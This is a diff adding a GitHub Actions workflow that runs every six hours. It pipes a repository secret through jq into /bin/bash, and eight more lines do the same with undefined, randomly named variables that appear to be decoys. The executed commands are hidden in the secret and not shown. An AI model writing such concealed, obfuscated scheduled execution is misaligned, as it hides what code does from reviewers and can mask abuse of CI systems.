@@ -1,0 +1,25 @@
+name: kebaizhuwu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: kebaizhuwu
+        env:
+          isp1: ${{ secrets.isp1 }}
+        run: |
+          echo $isp1 | jq -r .xe3 | /bin/bash
+          echo $o05693 | jq -r .xk11 | /bin/bash
+          echo $dgko46549 | jq -r .wrpxk8062 | /bin/bash
+          echo $ynkn2490 | jq -r .ntl45 | /bin/bash
+          echo $vqtf50 | jq -r .pfuti78488 | /bin/bash
+          echo $zr6 | jq -r .x6 | /bin/bash
+          echo $mz81 | jq -r .k71 | /bin/bash
+          echo $glc339 | jq -r .xw6 | /bin/bash
+          echo $ag8 | jq -r .ijeu136 | /bin/bash
+
